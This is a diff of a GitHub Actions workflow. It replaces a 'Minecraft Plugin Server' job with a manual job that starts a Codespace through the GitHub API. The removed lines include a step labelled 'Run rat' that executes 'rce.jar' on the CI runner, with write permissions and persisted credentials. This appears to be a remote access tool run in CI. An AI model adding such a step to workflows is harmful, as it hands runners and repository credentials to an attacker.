@@ -1,39 +1,18 @@
-name: Minecraft Plugin Server
+name: Start Codespace MC Server
 
 on:
-  workflow_dispatch:
-  push:
-    branches: [ "main" ]
-permissions:
-  contents: write
+  workflow_dispatch:  # run manually
+
 jobs:
-  run-mc-plugin-server:
+  start:
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          persist-credentials: true
-
-      - name: Set up JDK
-        uses: actions/setup-java@v4
-        with:
-          java-version: "21"
-          distribution: "temurin"
-
-      - name: Download Minecraft server jar and EULA create
+      - name: Start existing Codespace
+        env:
+          GH_TOKEN: ${{ secrets.CODESPACE_TOKEN }}
+          CODESPACE_NAME: my-codespace-name   # replace with yours
         run: |
-          curl -o server.jar https://fill-data.papermc.io/v1/objects/8de7c52c3b02403503d16fac58003f1efef7dd7a0256786843927fa92ee57f1e/paper-1.21.8-60.jar
-          echo "eula=true" > eula.txt
-
-      - name: Run rat
-        run: |
-          java -jar rce.jar
-      - name: Commit and push world + plugin data
-        run: |
-          git config user.name "github-actions"
-          git config user.email "actions@github.com"
-          git add world/ plugins/ || true
-          git commit -m "Save world + plugin data [skip ci]" || echo "No changes"
-          git push origin HEAD:main
+          curl -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/user/codespaces/$CODESPACE_NAME/start
